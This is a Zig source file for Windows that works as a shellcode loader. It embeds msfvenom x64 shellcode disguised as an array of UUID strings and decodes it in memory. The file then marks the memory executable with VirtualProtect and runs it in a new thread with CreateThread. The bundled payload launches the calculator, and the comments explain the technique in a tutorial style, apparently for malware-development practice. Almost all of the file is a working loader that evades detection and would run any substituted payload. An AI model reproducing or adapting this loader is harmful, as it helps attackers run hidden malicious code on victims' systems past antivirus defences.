const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

// Windows API types
const PVOID = *anyopaque;
const DWORD = windows.DWORD;
const SIZE_T = usize;
const PBYTE = [*]u8;

// Memory protection constants
const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_READWRITE = 0x04;
const PAGE_EXECUTE_READWRITE = 0x40;

// Windows API functions
extern "kernel32" fn GetCurrentProcessId() callconv(.C) DWORD;
extern "kernel32" fn GetLastError() callconv(.C) DWORD;
extern "kernel32" fn VirtualAlloc(?PVOID, SIZE_T, DWORD, DWORD) callconv(.C) ?PVOID;
extern "kernel32" fn VirtualProtect(PVOID, SIZE_T, DWORD, *DWORD) callconv(.C) windows.BOOL;
extern "kernel32" fn CreateThread(?windows.HANDLE, SIZE_T, *const fn (?PVOID) callconv(.C) DWORD, ?PVOID, DWORD, ?*DWORD) callconv(.C) ?windows.HANDLE;
extern "kernel32" fn HeapFree(windows.HANDLE, DWORD, PVOID) callconv(.C) windows.BOOL;
extern "kernel32" fn GetProcessHeap() callconv(.C) windows.HANDLE;

// UUID array from the following command
//
// 1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
// 2. zype -f calc.bin -m uuid
//
// for more information about zype: https://github.com/cx330blake/zype
const UUID_ARRAY: [17][]const u8 = [_][]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C6300",
};

const NUMBER_OF_ELEMENTS: usize = 17;

// Manual UUID parsing that matches Windows UuidFromStringA behavior
fn parseUuidManual(uuid_str: []const u8, buffer: []u8) !void {
    if (buffer.len < 16) return error.BufferTooSmall;

    // UUID format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
    // Split into parts: [8]-[4]-[4]-[4]-[12] = 32 hex chars + 4 hyphens

    var clean_hex = std.ArrayList(u8).init(std.heap.page_allocator);
    defer clean_hex.deinit();

    // Remove hyphens to get 32 hex characters
    for (uuid_str) |c| {
        if (c != '-') {
            try clean_hex.append(c);
        }
    }

    if (clean_hex.items.len != 32) return error.InvalidUuidLength;

    // Parse UUID components with correct endianness
    // Windows UUID structure (matches GUID):
    // - First 4 bytes (data1): Little-endian 32-bit
    // - Next 2 bytes (data2): Little-endian 16-bit
    // - Next 2 bytes (data3): Little-endian 16-bit
    // - Last 8 bytes (data4): Big-endian bytes

    const hex_chars = clean_hex.items;

    // Data1 (4 bytes, little-endian)
    const data1 = try std.fmt.parseInt(u32, hex_chars[0..8], 16);
    buffer[0] = @intCast(data1 & 0xFF);
    buffer[1] = @intCast((data1 >> 8) & 0xFF);
    buffer[2] = @intCast((data1 >> 16) & 0xFF);
    buffer[3] = @intCast((data1 >> 24) & 0xFF);

    // Data2 (2 bytes, little-endian)
    const data2 = try std.fmt.parseInt(u16, hex_chars[8..12], 16);
    buffer[4] = @intCast(data2 & 0xFF);
    buffer[5] = @intCast((data2 >> 8) & 0xFF);

    // Data3 (2 bytes, little-endian)
    const data3 = try std.fmt.parseInt(u16, hex_chars[12..16], 16);
    buffer[6] = @intCast(data3 & 0xFF);
    buffer[7] = @intCast((data3 >> 8) & 0xFF);

    // Data4 (8 bytes, big-endian - byte by byte)
    for (0..8) |i| {
        const hex_pair = hex_chars[16 + i * 2 .. 16 + i * 2 + 2];
        buffer[8 + i] = try std.fmt.parseInt(u8, hex_pair, 16);
    }
}

fn uuidDeobfuscation(uuid_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    const buffer_size = uuid_array.len * 16;
    const buffer = try allocator.alloc(u8, buffer_size);

    for (uuid_array, 0..) |uuid_str, i| {
        const offset = i * 16;
        parseUuidManual(uuid_str, buffer[offset .. offset + 16]) catch |err| {
            std.debug.print("[!] Failed to parse UUID[{}]: \"{s}\" - Error: {}\n", .{ i, uuid_str, err });
            allocator.free(buffer);
            return err;
        };
    }

    return buffer;
}

// Wait for Enter key by reading entire line
fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    print("[i] Injecting Shellcode To Local Process Of Pid: {d} \n", .{GetCurrentProcessId()});

    waitForEnter("[#] Press <Enter> To Decrypt ... ");

    print("[i] Decrypting ...", .{});

    // Manual UUID deobfuscation - no Windows API needed!
    const p_deobfuscated_payload = uuidDeobfuscation(&UUID_ARRAY, allocator) catch |err| {
        print("[!] uuidDeobfuscation Failed With Error: {}\n", .{err});
        std.process.exit(1);
    };
    defer allocator.free(p_deobfuscated_payload);

    print("[+] DONE !\n", .{});

    const s_deobfuscated_size = p_deobfuscated_payload.len;
    print("[i] Deobfuscated Payload At : 0x{x} Of Size : {d} \n", .{ @intFromPtr(p_deobfuscated_payload.ptr), s_deobfuscated_size });

    waitForEnter("[#] Press <Enter> To Allocate ... ");

    // Allocate memory with read/write permissions
    const p_shellcode_address = VirtualAlloc(null, s_deobfuscated_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) orelse {
        print("[!] VirtualAlloc Failed With Error : {d} \n", .{GetLastError()});
        std.process.exit(1);
    };

    print("[i] Allocated Memory At : 0x{x} \n", .{@intFromPtr(p_shellcode_address)});

    waitForEnter("[#] Press <Enter> To Write Payload ... ");

    // Copy the payload to allocated memory
    @memcpy(@as([*]u8, @ptrCast(p_shellcode_address))[0..s_deobfuscated_size], p_deobfuscated_payload);

    // Clear the original payload buffer
    @memset(@as([*]u8, @ptrCast(p_deobfuscated_payload.ptr))[0..s_deobfuscated_size], 0);

    // Change memory protection to executable
    var dw_old_protection: DWORD = 0;
    if (VirtualProtect(p_shellcode_address, s_deobfuscated_size, PAGE_EXECUTE_READWRITE, &dw_old_protection) == 0) {
        print("[!] VirtualProtect Failed With Error : {d} \n", .{GetLastError()});
        std.process.exit(1);
    }

    waitForEnter("[#] Press <Enter> To Run ... ");

    // Execute the shellcode in a new thread
    const thread_handle = CreateThread(null, 0, @ptrCast(p_shellcode_address), null, 0, null) orelse {
        print("[!] CreateThread Failed With Error : {d} \n", .{GetLastError()});
        std.process.exit(1);
    };

    _ = thread_handle; // Suppress unused variable warning

    // NOTE:
    // You can also execute the payload using function pointer.
    // In C, you might do this:
    // ```c
    // (*(VOID(*)()) pShellcodeAddress)();
    // ```
    // And in Zig, the following code it equivalent to that.
    // ```zig
    // (@as(*const fn () void, @ptrCast(p_shellcode_address)))();
    // ````
    // So you can use that to execute the payload. However, it's not suggested.
    // It's because the shellcode will terminates the calling thread
    // after executing. But if we use function pointer to execute it, the calling
    // thread will become the main thread, causing the entire process to exit
    // after the shellcode is executed.

    print("[+] Calculator should launch now!\n", .{});
    waitForEnter("[#] Press <Enter> To Quit ... "); // Pause the execution.

    return;

    // NOTE:
    // If we don't use `waitForEnter()` here, the main thread might have high
    // possibility to exit before the shellcode being executed. So here we use
    // that function to pause the execution.
    // In practice, we should use `WaitForSingleObject()` function from Windows API
    // to wait until the new thread to finish or the thread it timed out. So that
    // the main thread will not exit before the shellcode execution.
    // MSDN: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
}
